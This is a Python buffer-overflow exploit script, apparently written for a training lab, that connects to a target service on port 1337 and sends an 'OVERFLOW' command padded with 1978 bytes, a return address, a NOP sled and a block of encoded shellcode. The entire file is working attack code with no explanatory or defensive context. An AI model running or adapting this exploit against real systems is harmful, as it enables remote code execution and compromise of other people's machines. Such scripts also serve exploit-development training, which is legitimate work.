import socket, sys

# Call like
# $ python3 exploit.py "10.10.X.X" 1

ip = sys.argv[1]
id = sys.argv[2]
port = 1337

prefix = "OVERFLOW" + id + " "
offset = 1978
overflow = "A" * offset
retn = "\x03\x12\x50\x62"
padding = "\x90" * 16
payload=("\xba\xc9\x28\x33\x35\xda\xd8\xd9\x74\x24\xf4\x5f\x2b\xc9"
"\xb1\x52\x31\x57\x12\x83\xef\xfc\x03\x9e\x26\xd1\xc0\xdc"
"\xdf\x97\x2b\x1c\x20\xf8\xa2\xf9\x11\x38\xd0\x8a\x02\x88"
"\x92\xde\xae\x63\xf6\xca\x25\x01\xdf\xfd\x8e\xac\x39\x30"
"\x0e\x9c\x7a\x53\x8c\xdf\xae\xb3\xad\x2f\xa3\xb2\xea\x52"
"\x4e\xe6\xa3\x19\xfd\x16\xc7\x54\x3e\x9d\x9b\x79\x46\x42"
"\x6b\x7b\x67\xd5\xe7\x22\xa7\xd4\x24\x5f\xee\xce\x29\x5a"
"\xb8\x65\x99\x10\x3b\xaf\xd3\xd9\x90\x8e\xdb\x2b\xe8\xd7"
"\xdc\xd3\x9f\x21\x1f\x69\x98\xf6\x5d\xb5\x2d\xec\xc6\x3e"
"\x95\xc8\xf7\x93\x40\x9b\xf4\x58\x06\xc3\x18\x5e\xcb\x78"
"\x24\xeb\xea\xae\xac\xaf\xc8\x6a\xf4\x74\x70\x2b\x50\xda"
"\x8d\x2b\x3b\x83\x2b\x20\xd6\xd0\x41\x6b\xbf\x15\x68\x93"
"\x3f\x32\xfb\xe0\x0d\x9d\x57\x6e\x3e\x56\x7e\x69\x41\x4d"
"\xc6\xe5\xbc\x6e\x37\x2c\x7b\x3a\x67\x46\xaa\x43\xec\x96"
"\x53\x96\xa3\xc6\xfb\x49\x04\xb6\xbb\x39\xec\xdc\x33\x65"
"\x0c\xdf\x99\x0e\xa7\x1a\x4a\x3b\x31\x5b\xef\x53\x43\xa3"
"\xfe\xff\xca\x45\x6a\x10\x9b\xde\x03\x89\x86\x94\xb2\x56"
"\x1d\xd1\xf5\xdd\x92\x26\xbb\x15\xde\x34\x2c\xd6\x95\x66"
"\xfb\xe9\x03\x0e\x67\x7b\xc8\xce\xee\x60\x47\x99\xa7\x57"
"\x9e\x4f\x5a\xc1\x08\x6d\xa7\x97\x73\x35\x7c\x64\x7d\xb4"
"\xf1\xd0\x59\xa6\xcf\xd9\xe5\x92\x9f\x8f\xb3\x4c\x66\x66"
"\x72\x26\x30\xd5\xdc\xae\xc5\x15\xdf\xa8\xc9\x73\xa9\x54"
"\x7b\x2a\xec\x6b\xb4\xba\xf8\x14\xa8\x5a\x06\xcf\x68\x7a"
"\xe5\xc5\x84\x13\xb0\x8c\x24\x7e\x43\x7b\x6a\x87\xc0\x89"
"\x13\x7c\xd8\xf8\x16\x38\x5e\x11\x6b\x51\x0b\x15\xd8\x52"
"\x1e")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
